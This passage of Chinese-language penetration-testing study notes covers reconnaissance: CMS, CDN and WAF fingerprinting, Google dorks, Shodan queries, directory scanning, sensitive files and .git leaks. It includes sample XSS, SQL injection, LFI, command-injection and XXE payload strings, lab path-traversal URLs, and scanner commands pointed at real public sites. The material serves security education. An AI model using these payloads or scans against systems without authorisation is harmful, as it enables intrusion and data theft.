Weblogic、Websphere等； </li><li>操作系统信息：比如Linux、win2k8、 win7、Kali、Centos等； </li><li>CDN信息：是否使用CDN，如cloudflare、 帝联、蓝讯、网宿、七牛云、阿里云等； </li><li>WAF信息：是否使用WAF，如D盾、云锁、 宝塔、安全狗、360等</li></ol><h2 id="2、什么是CMS？"><a href="#2、什么是CMS？" class="headerlink" title="2、什么是CMS？"></a>2、什么是CMS？</h2><p>Content Management System </p><p>内容管理系统 </p><h3 id="常见CMS"><a href="#常见CMS" class="headerlink" title="常见CMS"></a>常见CMS</h3><ul><li>企业建站系统：MetInfo(米拓)、蝉知、 SiteServer CMS等; </li><li>B2C商城系统：商派Shopex、ECshop、 HiShop、XpShop等;</li><li>门户建站系统：DedeCMS(织梦)、帝国CMS、 PHPCMS、动易、CmsTop等; </li><li>博客系统：WordPress、Z-Blog等; </li><li>论坛社区：Discuz、PHPwind、WeCenter等; 问答系统：Tipask、whatsns等; </li><li>知识百科系统：HDwiki; B2B门户系统：Destoon、B2Bbuilder、友邻 B2B等; </li><li>人才招聘网站系统：骑士CMS、PHP云人才管理 系统; </li><li>房产网站系统：FangCms等; </li><li>在线教育建站系统：Kesion、EduSoho; </li><li>电影网站系统：苹果CMS、ctcms、movcms等; </li><li>小说文学建站系统：杰奇CMS;</li></ul><h2 id="3、CMS指纹识别的思路"><a href="#3、CMS指纹识别的思路" class="headerlink" title="3、CMS指纹识别的思路"></a>3、CMS指纹识别的思路</h2><h4 id="版权信息"><a href="#版权信息" class="headerlink" title="版权信息"></a>版权信息</h4><p>Powered by XXX </p><h4 id="特定的文件MD5"><a href="#特定的文件MD5" class="headerlink" title="特定的文件MD5"></a>特定的文件MD5</h4><p><a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a> </p><h4 id="查看网页源码"><a href="#查看网页源码" class="headerlink" title="查看网页源码"></a>查看网页源码</h4><p>分析特定的路径或者代码内容 </p><h4 id="特定文件"><a href="#特定文件" class="headerlink" title="特定文件"></a>特定文件</h4><p>比如robots.txt</p><h2 id="4、CMS指纹识别的工具"><a href="#4、CMS指纹识别的工具" class="headerlink" title="4、CMS指纹识别的工具"></a>4、CMS指纹识别的工具</h2><h3 id="Kali自带工具"><a href="#Kali自带工具" class="headerlink" title="Kali自带工具"></a>Kali自带工具</h3><h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h4><p><code>whatweb -v www.discuz.net</code> </p><h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><h4 id="whatruns"><a href="#whatruns" class="headerlink" title="whatruns"></a>whatruns</h4><p><a href="https://www.whatruns.com/">https://www.whatruns.com/</a> </p><h4 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h4><p><a href="https://www.wappalyzer.com/">https://www.wappalyzer.com</a> </p><h3 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h3><ul><li><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a> </li><li><a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></li></ul><h3 id="离线工具"><a href="#离线工具" class="headerlink" title="离线工具"></a>离线工具</h3><ul><li>御剑指纹扫描器（需要.NET Framework） </li><li>Test404轻量CMS指纹识别</li></ul><h3 id="其他开源程序"><a href="#其他开源程序" class="headerlink" title="其他开源程序"></a>其他开源程序</h3><p><a href="https://github.com/Tuhinshubhra/CMSeek">https://github.com/Tuhinshubhra/CMSeek</a></p><h1 id="CDN指纹识别"><a href="#CDN指纹识别" class="headerlink" title="CDN指纹识别"></a>CDN指纹识别</h1><h2 id="1、CDN指纹识别思路"><a href="#1、CDN指纹识别思路" class="headerlink" title="1、CDN指纹识别思路"></a>1、CDN指纹识别思路</h2><h3 id="如何找出真实IP"><a href="#如何找出真实IP" class="headerlink" title="如何找出真实IP"></a>如何找出真实IP</h3><ul><li>超级ping </li><li>历史DNS </li><li>通过子域名查询IP</li><li>国外主机解析 </li><li>其他</li></ul><h3 id="CDN如何配置"><a href="#CDN如何配置" class="headerlink" title="CDN如何配置"></a>CDN如何配置</h3><ul><li>通过配置CNAME（别名记录） </li><li><a href="https://help.aliyun.com/document_detail/27144.html">https://help.aliyun.com/document_detail/27144.html</a></li></ul><h2 id="2、CDN指纹识别工具"><a href="#2、CDN指纹识别工具" class="headerlink" title="2、CDN指纹识别工具"></a>2、CDN指纹识别工具</h2><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><h4 id="kali自带lbd"><a href="#kali自带lbd" class="headerlink" title="kali自带lbd"></a>kali自带lbd</h4><p><code>ldb www.12306.cn</code> </p><p><code>load balance detector</code> </p><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p><code>ping www.alibaba.com</code> </p><h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><p><code>nslookup www.bilibili.com</code> </p><h4 id="超级ping"><a href="#超级ping" class="headerlink" title="超级ping"></a>超级ping</h4><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com</a> </p><h4 id="专用识别工具"><a href="#专用识别工具" class="headerlink" title="专用识别工具"></a>专用识别工具</h4><ul><li><a href="http://cdn.chinaz.com/">http://cdn.chinaz.com/</a> </li><li><a href="https://www.cdnplanet.com/tools/cdnfinder/">https://www.cdnplanet.com/tools/cdnfinder/</a></li></ul><h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><ul><li><a href="https://github.com/boy-hack/w8fuckcdn/">https://github.com/boy-hack/w8fuckcdn/</a> </li><li><a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a></li></ul><h1 id="WAF指纹识别"><a href="#WAF指纹识别" class="headerlink" title="WAF指纹识别"></a>WAF指纹识别</h1><h2 id="什么是WAF"><a href="#什么是WAF" class="headerlink" title="什么是WAF"></a>什么是WAF</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>WAF Web Application Firewall </p><p>Web 应用防火墙 </p><p>过滤HTTP或者HTTPS的请求，识别并拦截恶意 的请求  </p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>硬件型 WAF</li><li>云 WAF</li><li>软件型 WAF</li></ul><h2 id="常见WAF厂商"><a href="#常见WAF厂商" class="headerlink" title="常见WAF厂商"></a>常见WAF厂商</h2><ul><li>各种云：阿里云、腾讯云、华为云、百度云…… </li><li>安全狗、宝塔、360、知道创宇、长亭、安恒…</li></ul><h2 id="WAF的识别思路"><a href="#WAF的识别思路" class="headerlink" title="WAF的识别思路"></a>WAF的识别思路</h2><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><ol><li>额外的cookie，比如云锁</li><li>任何响应或请求的附加标头，比如安全宝 </li><li>响应内容（如果被阻止请求）增加标识，比 如DotDefender, Armor, Sitelock </li><li>响应代码（如果被阻止请求），比如 WebKnight, 360 WAF</li></ol><h3 id="指纹库"><a href="#指纹库" class="headerlink" title="指纹库"></a>指纹库</h3><p> <a href="https://github.com/CSecGroup/wafid/blob/master/finger.xml">https://github.com/CSecGroup/wafid/blob/master/finger.xml</a> </p><h2 id="怎么触发WAF"><a href="#怎么触发WAF" class="headerlink" title="怎么触发WAF"></a>怎么触发WAF</h2><p>URL或者表单输入恶意内容 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xsstring <span class="token operator">=</span> <span class="token string">'&lt;script&gt;alert("XSS");&lt;/script&gt;'</span>sqlistring <span class="token operator">=</span> <span class="token string">"UNION SELECT ALL FROM information_schema AND ' or SLEEP(5) or '"</span>lfistring <span class="token operator">=</span> <span class="token string">'../../../../etc/passwd'</span>rcestring <span class="token operator">=</span> <span class="token string">'/bin/cat /etc/passwd; ping 127.0.0.1; curl google.com'</span>xxestring <span class="token operator">=</span> <span class="token string">'&lt;!ENTITY xxe SYSTEM "file:///etc/shadow"&gt;]&gt;&lt;pwn&gt;&amp;hack;&lt;/pwn&gt;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WAF的识别工具"><a href="#WAF的识别工具" class="headerlink" title="WAF的识别工具"></a>WAF的识别工具</h2><h3 id="Kali自带"><a href="#Kali自带" class="headerlink" title="Kali自带"></a>Kali自带</h3><p><code>wafw00f https://www.12306.cn</code> </p><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a> </p><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p><code>nmap www.12306.cn --script=http-wafdetect.nse</code> </p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><code>sqlmap -u "https://pinpai.smzdm.com/1773/gushi/?id=1" --identify-waf --batch</code> </p><h3 id="其他-2"><a href="#其他-2" class="headerlink" title="其他"></a>其他</h3><p><a href="https://github.com/0xInfection/Awesome-WAF">https://github.com/0xInfection/Awesome-WAF</a></p><h1 id="搜索引擎收集信息"><a href="#搜索引擎收集信息" class="headerlink" title="搜索引擎收集信息"></a>搜索引擎收集信息</h1><h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><ul><li>2002 </li><li>Johnny Long </li><li>Google Dorks ——Google Hacking</li></ul><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ul><li><p>完全匹配 </p><p>“网络安全工程师” </p></li><li><p>任意字词 </p><p>批发 OR 特价 </p></li><li><p>不包含 </p><p>burp suite -xxx </p></li><li><p>数字范围 </p><p>number..number</p></li></ul><h2 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h2><h3 id="只搜索某个网站的内容-、"><a href="#只搜索某个网站的内容-、" class="headerlink" title="只搜索某个网站的内容 、"></a>只搜索某个网站的内容 、</h3><p><code>site:zhihu.com</code> </p><h3 id="网页的内容包括"><a href="#网页的内容包括" class="headerlink" title="网页的内容包括"></a>网页的内容包括</h3><p><code>allintext: Powered by Discuz</code> </p><p><code>intext: Powered by Discuz</code> </p><h3 id="标题出现"><a href="#标题出现" class="headerlink" title="标题出现"></a>标题出现</h3><p><code>intitle: 后台登录</code> </p><p><code>allintitle: 后台登录</code> </p><h3 id="URL地址包括"><a href="#URL地址包括" class="headerlink" title="URL地址包括"></a>URL地址包括</h3><p><code>allinurl: admin.php</code> </p><p><code>inurl: index.php?id=1</code> </p><h3 id="文件类型指定"><a href="#文件类型指定" class="headerlink" title="文件类型指定"></a>文件类型指定</h3><p>filetype:pdf </p><h3 id="index-of"><a href="#index-of" class="headerlink" title="index of"></a>index of</h3><h3 id="可以结合使用"><a href="#可以结合使用" class="headerlink" title="可以结合使用"></a>可以结合使用</h3><h2 id="语法数据库"><a href="#语法数据库" class="headerlink" title="语法数据库"></a>语法数据库</h2><ul><li><a href="https://www.exploit-db.com/googlehacking-database">https://www.exploit-db.com/googlehacking-database</a></li><li><a href="https://github.com/BullsEye0/google_dork_list">https://github.com/BullsEye0/google_dork_list</a></li></ul><h2 id="工具-5"><a href="#工具-5" class="headerlink" title="工具"></a>工具</h2><h3 id="github搜索"><a href="#github搜索" class="headerlink" title="github搜索"></a>github搜索</h3><ul><li>google hacking </li><li>google dorks</li></ul><h1 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h1><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><h3 id="360水滴直播时间"><a href="#360水滴直播时间" class="headerlink" title="360水滴直播时间"></a>360水滴直播时间</h3><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><ul><li>除了网络摄像头之外，网络空间还包括什么？ </li><li>黑客是怎么找到某一个网络设备的？</li></ul><h2 id="什么是网络空间？"><a href="#什么是网络空间？" class="headerlink" title="什么是网络空间？"></a>什么是网络空间？</h2><h3 id="Cyber-space"><a href="#Cyber-space" class="headerlink" title="Cyber space"></a>Cyber space</h3><h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><ul><li>1996  数字图书馆</li><li>1998 谷歌诞生</li></ul><h2 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h2><ul><li>网页  </li><li>图片 </li><li>音乐 </li><li>声音 </li><li>电视剧 </li><li>……</li></ul><h3 id="进一步"><a href="#进一步" class="headerlink" title="进一步"></a>进一步</h3><h5 id="网络系统"><a href="#网络系统" class="headerlink" title="网络系统"></a>网络系统</h5><ul><li>CDN </li><li>CMS </li><li>IDS intrusion detection system </li><li>办公软件 数</li><li>据库服务 </li><li>杀毒软件 </li><li>文件服务NFS</li></ul><h5 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h5><ul><li>手机 </li><li>平板电脑 </li><li>交换机 </li><li>路由器 </li><li>网络摄像头 </li><li>私人网盘 </li><li>打印机 </li><li>ATM </li><li>物联网家电 </li><li>机器人</li></ul><h5 id="工业系统"><a href="#工业系统" class="headerlink" title="工业系统"></a>工业系统</h5><ul><li>交通信号灯 </li><li>企业大屏幕 </li><li>公园控制系统 </li><li>加油站 </li><li>电网 </li><li>自来水厂 </li><li>核电站</li></ul><h2 id="网络空间搜索引擎-1"><a href="#网络空间搜索引擎-1" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h2><h3 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h3><p>Open source intelligence </p><p>开源网络情报 </p><h3 id="怎么扫描？"><a href="#怎么扫描？" class="headerlink" title="怎么扫描？"></a>怎么扫描？</h3><h4 id="用网络扫描的工具"><a href="#用网络扫描的工具" class="headerlink" title="用网络扫描的工具"></a>用网络扫描的工具</h4><ul><li>nmap </li><li>zmap</li></ul><h4 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h4><ul><li>IP库 </li><li>枚举</li></ul><h3 id="怎么标识一个设备呢？"><a href="#怎么标识一个设备呢？" class="headerlink" title="怎么标识一个设备呢？"></a>怎么标识一个设备呢？</h3><ul><li>爬虫 ——url </li><li>ip ——域名 </li><li>开放端口 </li><li>操作系统 </li><li>物理地址 ——深圳、北京 </li><li>MAC地址 </li><li>设备的类型</li></ul><h3 id="实施威胁地图"><a href="#实施威胁地图" class="headerlink" title="实施威胁地图"></a>实施威胁地图</h3><p><a href="https://www.fireeye.com/cyber-map/threatmap.html">https://www.fireeye.com/cyber-map/threatmap.html</a> </p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p> 安全研究者</p><h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><h3 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h3><ul><li><p>地图、截图、监控 </p></li><li><p>新手指引 </p></li><li><p>视频教程 </p></li><li><p>开发者工具 </p></li><li><p>Filter过滤器 </p><p>​e.g. 基本使用</p></li></ul><p>​<code>tomcat country:"CN"</code> </p><p>​<code>apache city:"Changsha"</code> </p><p>​<code>server: gws hostname:"google"</code></p><ul><li>Explore</li></ul><h3 id="CLI"><a href="#CLI" class="headerlink" title="CLI"></a>CLI</h3><ul><li>命令行工具 </li><li>kali自带 </li><li>alert Manage the network alerts for your account # 管理账户的网络提示</li><li>convert Convert the given input data file into a… # 转换输入文件</li><li>count Returns the number of results for a search # 返回查询结果数量 </li><li>download Download search results and save them in a… # 下载查询结果到文件 </li><li>honeyscore Check whether the IP is a honeypot or not. # 检查 IP 是否为蜜罐 </li><li>host View all available information for an IP… # 显示一个 IP 所有可用的详细信息 </li><li>info Shows general information about your account # 显示账户的一般信息</li><li>init Initialize the Shodan command-line # 初始化命令行 </li><li>myip Print your external IP address # 输出 用户当前公网IP </li><li>parse Extract information out of compressed JSON… # 解析提取压缩的JSON信 息，即使用download下载的数据 </li><li>scan Scan an IP/ netblock using Shodan. # 使用 Shodan 扫描一个IP或者网段 </li><li>search Search the Shodan database # 查询 Shodan 数据库 </li><li>stats Provide summary information about a search… # 提供搜索结果的概要信息 </li><li>stream Stream data in real-time. # 实时显示 流数据 # 管理账户的网络提示</li></ul><h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><ul><li><code>shodan host 172.67.167.88</code> </li><li><code>shodan count apache shodan</code> </li><li><code>count vuln:cve-2019-0708</code> </li><li><code>shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0</code> </li><li><code>shodan stats port:445 SMB</code> </li><li><code>shodan download --limit -1 test net:172.67.167.88/24</code></li></ul><h3 id="工具-6"><a href="#工具-6" class="headerlink" title="工具"></a>工具</h3><ul><li><a href="https://github.com/jakejarvis/awesomeshodan-queries">https://github.com/jakejarvis/awesomeshodan-queries</a> （语法） </li><li><a href="https://github.com/random-robbie/MyShodan-Scripts">https://github.com/random-robbie/MyShodan-Scripts</a> （python脚本）</li></ul><h2 id="其他的网络空间搜索引擎"><a href="#其他的网络空间搜索引擎" class="headerlink" title="其他的网络空间搜索引擎"></a>其他的网络空间搜索引擎</h2><h3 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a>Censys</h3><ul><li>没有收费</li><li>收录了证书 </li><li>ZMap和ZGrab</li></ul><h3 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h3><ul><li>网络空间资源测绘</li><li>Xmap</li></ul><h3 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h3><h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><ul><li><p>创建的时间 </p></li><li><p>搜索的内容 </p><p>web系统 </p><p>SSL </p><p>图标 </p><p>网络设备 </p></li><li><p>现有的数据 </p></li><li><p>扫描的引擎</p></li><li><p>更新频率 </p></li><li><p>API支持 </p></li><li><p>价格</p></li></ul><h2 id="工具-7"><a href="#工具-7" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a> </li><li><a href="https://github.com/coco413/DiscoverTarget">https://github.com/coco413/DiscoverTarget</a> </li><li><a href="https://github.com/saucer-man/saucerfram">https://github.com/saucer-man/saucerfram</a></li></ul><h1 id="目录扫描收集信息"><a href="#目录扫描收集信息" class="headerlink" title="目录扫描收集信息"></a>目录扫描收集信息</h1><h2 id="什么是目录扫描"><a href="#什么是目录扫描" class="headerlink" title="什么是目录扫描"></a>什么是目录扫描</h2><h3 id="部署的网站有一些敏感文件"><a href="#部署的网站有一些敏感文件" class="headerlink" title="部署的网站有一些敏感文件"></a>部署的网站有一些敏感文件</h3><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>xxx.cfg </p><h4 id="数据文件"><a href="#数据文件" class="headerlink" title="数据文件"></a>数据文件</h4><ul><li>xxx.sql </li><li>.tar.gz</li></ul><h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul><li>/backup </li><li>/conf </li><li>/admin</li></ul><h3 id="会泄露哪些信息"><a href="#会泄露哪些信息" class="headerlink" title="会泄露哪些信息"></a>会泄露哪些信息</h3><ul><li>数据库用户名和密码 </li><li>网站源码</li><li>服务器的用户名和密码 </li><li>数据库的文件 </li><li>…..</li></ul><h3 id="为什么会泄露？"><a href="#为什么会泄露？" class="headerlink" title="为什么会泄露？"></a>为什么会泄露？</h3><h4 id="配置不当的问题"><a href="#配置不当的问题" class="headerlink" title="配置不当的问题"></a>配置不当的问题</h4><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><h5 id="local-file-inclusion（LFI）"><a href="#local-file-inclusion（LFI）" class="headerlink" title="local file inclusion（LFI）"></a>local file inclusion（LFI）</h5><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><ul><li>header.php </li><li>common.php </li><li>footer.php </li><li>function.php</li></ul><h5 id="include-“路径-x2F-文件”"><a href="#include-“路径-x2F-文件”" class="headerlink" title="include(“路径/文件”)"></a>include(“路径/文件”)</h5><p>include(“../../..”) </p><h5 id="require"><a href="#require" class="headerlink" title="require();"></a>require();</h5><h5 id="dvwa靶场"><a href="#dvwa靶场" class="headerlink" title="dvwa靶场"></a>dvwa靶场</h5><p><a href="http://localhost/dvwa/vulnerabilities/fi/?page=%60../../phpinfo.php%60">http://localhost/dvwa/vulnerabilities/fi/?page=`../../phpinfo.php`</a> </p><p><a href="http://localhost/dvwa/vulnerabilities/fi/?page=%60../../../../../../../in.txt%60">http://localhost/dvwa/vulnerabilities/fi/?page=`../../../../../../../in.txt`</a></p><h2 id="常见的敏感目录和文件"><a href="#常见的敏感目录和文件" class="headerlink" title="常见的敏感目录和文件"></a>常见的敏感目录和文件</h2><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><h3 id="sitemap-xml"><a href="#sitemap-xml" class="headerlink" title="sitemap.xml"></a>sitemap.xml</h3><h3 id="网站的备份文件-x2F-数据"><a href="#网站的备份文件-x2F-数据" class="headerlink" title="网站的备份文件/数据"></a>网站的备份文件/数据</h3><h4 id="在线压缩"><a href="#在线压缩" class="headerlink" title="在线压缩"></a>在线压缩</h4><ul><li><p>路径 </p></li><li><p>文件名 </p></li><li><p>wwwroot </p><p>20210819.zip</p></li></ul><h4 id="帝国备份王"><a href="#帝国备份王" class="headerlink" title="帝国备份王"></a>帝国备份王</h4><p>1.sql ——1.zip </p><h3 id="后台登录的目录"><a href="#后台登录的目录" class="headerlink" title="后台登录的目录"></a>后台登录的目录</h3><ul><li>/admin </li><li>/manage</li></ul><h3 id="安装包（源码）"><a href="#安装包（源码）" class="headerlink" title="安装包（源码）"></a>安装包（源码）</h3><ul><li>非开源，商用 </li><li>1.zip</li></ul><h3 id="上传的目录"><a href="#上传的目录" class="headerlink" title="上传的目录"></a>上传的目录</h3><ul><li>/upload </li><li>/upload.php </li><li>文件上传漏洞 webshell</li></ul><h3 id="mysql的管理界面"><a href="#mysql的管理界面" class="headerlink" title="mysql的管理界面"></a>mysql的管理界面</h3><ul><li>MySQL</li><li>web页面去管理 </li><li>phpadmin 密码爆破 webshell</li></ul><h3 id="程序的安装路径"><a href="#程序的安装路径" class="headerlink" title="程序的安装路径"></a>程序的安装路径</h3><ul><li>/install</li></ul><h3 id="php的探针"><a href="#php的探针" class="headerlink" title="php的探针"></a>php的探针</h3><ul><li>phpinfo </li><li>雅黑探针</li></ul><h3 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h3><ul><li><p>Ueditor </p><p><a href="https://github.com/fex-team/ueditor">https://github.com/fex-team/ueditor</a></p></li><li><p>kindeditor </p></li><li><p>CKeditor  </p></li><li><p>文件上传漏洞、命令注入</p></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li><code>/etc/passwd</code> </li><li><code>/etc/shadow</code> ——SHA512 </li><li><code>/etc/sudoers</code> ——sudo</li></ul><h3 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h3><p>.DS_Store </p><h3 id="编辑器的临时文件-swp"><a href="#编辑器的临时文件-swp" class="headerlink" title="编辑器的临时文件.swp"></a>编辑器的临时文件.swp</h3><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><ul><li><p>Windows IIS </p></li><li><p>Apache </p></li><li><p>pikachu靶场 </p><p><a href="http://localhost/pikachu/vul/dir/dir_list.php?title=jarheads.php">http://localhost/pikachu/vul/dir/dir_list.php?title=jarheads.php</a> </p><p><a href="http://localhost/pikachu/vul/dir/dir_list.php?title=../../../../Windows/win.ini">http://localhost/pikachu/vul/dir/dir_list.php?title=../../../../Windows/win.ini</a></p></li></ul><h3 id="tomcat-WEB-INF"><a href="#tomcat-WEB-INF" class="headerlink" title="tomcat WEB-INF"></a>tomcat WEB-INF</h3><ul><li>WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应 用组件配置及命名规则. </li><li>WEB-INF/database.properties : 数据库配置文件 </li><li>WEB-INF/classes/ : 一般用来存放Java类文件(.class) </li><li>WEB-INF/lib/ : 用来存放打包好的库(.jar) </li><li>WEB-INF/src/ : 用来放源代码(.asp和.php等)</li></ul><h3 id="其他非常规文件"><a href="#其他非常规文件" class="headerlink" title="其他非常规文件"></a>其他非常规文件</h3><ul><li>secret.txt</li><li>password.txt</li></ul><h2 id="文件扫描思路"><a href="#文件扫描思路" class="headerlink" title="文件扫描思路"></a>文件扫描思路</h2><h3 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h3><p>直接在域名后面拼接路径/文件名，如果返回 200，就是存在 </p><h3 id="扫描方法？"><a href="#扫描方法？" class="headerlink" title="扫描方法？"></a>扫描方法？</h3><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p>dir xxx ——dir xxx </p><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>dict</p><h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><h5 id="1位"><a href="#1位" class="headerlink" title="1位"></a>1位</h5><ul><li>a-z </li><li>0-9</li></ul><h5 id="2位"><a href="#2位" class="headerlink" title="2位"></a>2位</h5><ul><li>aa </li><li>00 </li><li>a0 </li><li>9z</li></ul><h4 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h4><ul><li>robots.txt </li><li>sitemap.xlml </li><li>网页中的其他链接</li></ul><h4 id="fuzz（模糊测试）"><a href="#fuzz（模糊测试）" class="headerlink" title="fuzz（模糊测试）"></a>fuzz（模糊测试）</h4><p> 字典 </p><ul><li>/word</li><li>/index.php?word=</li></ul><h2 id="文件扫描的字典"><a href="#文件扫描的字典" class="headerlink" title="文件扫描的字典"></a>文件扫描的字典</h2><h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><ul><li><p>wordlists</p></li><li><p>dirb </p><p>/usr/share/wordlists/dirb/common.txt</p></li></ul><h2 id="工具-8"><a href="#工具-8" class="headerlink" title="工具"></a>工具</h2><ul><li><p>kali </p></li><li><p>dirb </p></li><li><p>dirbuster </p></li><li><p>御剑 </p></li><li><p>Burp Suite</p><p>Intruder ——payload </p><p><a href="http://www.baidu.com/$bbs$">www.baidu.com/$bbs$</a> </p></li><li><p>DirBrute </p></li><li><p>Dirsearch </p></li><li><p>Dirmap </p></li><li><p>wfuzz</p></li></ul><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h4 id="WAF、IDS"><a href="#WAF、IDS" class="headerlink" title="WAF、IDS"></a>WAF、IDS</h4><ul><li>代理 </li><li>网络空间搜索引擎</li></ul><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li>权限 </li><li>删除敏感文件 </li><li>WAF、IDS</li></ul><h1 id="Git信息收集"><a href="#Git信息收集" class="headerlink" title="Git信息收集"></a>Git信息收集</h1><h3 id="什么是版本控制系统"><a href="#什么是版本控制系统" class="headerlink" title="什么是版本控制系统"></a>什么是版本控制系统</h3><h4 id="代码的恢复、备份"><a href="#代码的恢复、备份" class="headerlink" title="代码的恢复、备份"></a>代码的恢复、备份</h4><ul><li>修改仓库难以管理 </li><li>整个工程直接打包，占用空间过多</li></ul><h4 id="Version-Control-System"><a href="#Version-Control-System" class="headerlink" title="Version Control System"></a>Version Control System</h4><h4 id="发展阶段"><a href="#发展阶段" class="headerlink" title="发展阶段"></a>发展阶段</h4><h5 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h5><p>DVCS</p><h5 id="协同开发"><a href="#协同开发" class="headerlink" title="协同开发"></a>协同开发</h5><h6 id="文件冲突？"><a href="#文件冲突？" class="headerlink" title="文件冲突？"></a>文件冲突？</h6><ul><li>自动合并不冲突的内容 </li><li>标记冲突的内容</li></ul><h6 id="集中化的VCS"><a href="#集中化的VCS" class="headerlink" title="集中化的VCS"></a>集中化的VCS</h6><ul><li><p>Centralized Version Control Systems ——CVC</p></li><li><p>代表 </p><p>CVS Concurrent Versions System </p><p>SVN</p></li></ul><h5 id="去中心化"><a href="#去中心化" class="headerlink" title="去中心化"></a>去中心化</h5><h6 id="分布式CVS"><a href="#分布式CVS" class="headerlink" title="分布式CVS"></a>分布式CVS</h6><ul><li><p>Distributed Version Control System——DVCS</p></li><li><p>代表 </p><p>Github、Gitlab、码云 </p><p>Git ——Linus Torwalds——BitKeeper</p></li></ul><h2 id="为什么Git会导致信息泄露"><a href="#为什么Git会导致信息泄露" class="headerlink" title="为什么Git会导致信息泄露"></a>为什么Git会导致信息泄露</h2><h3 id="把私有仓库-x2F-隐私文件提交到了github"><a href="#把私有仓库-x2F-隐私文件提交到了github" class="headerlink" title="把私有仓库/隐私文件提交到了github"></a>把私有仓库/隐私文件提交到了github</h3><h3 id="部署项目的时候，不小心把-git-文件一起打包进去，放到web网站的目录下"><a href="#部署项目的时候，不小心把-git-文件一起打包进去，放到web网站的目录下" class="headerlink" title="部署项目的时候，不小心把 .git 文件一起打包进去，放到web网站的目录下"></a>部署项目的时候，不小心把 .git 文件一起打包进去，放到web网站的目录下</h3><p>java——.class—— war</p><h4 id="git有用的内容"><a href="#git有用的内容" class="headerlink" title=".git有用的内容"></a>.git有用的内容</h4><ul><li>.git/logs/HEAD 存储了git的log信息，可以找到历史的commit项 </li><li>.git/index 缓存git add的文件，暂存区 </li><li>.git/refs/stash git stash 把代码存入缓存区 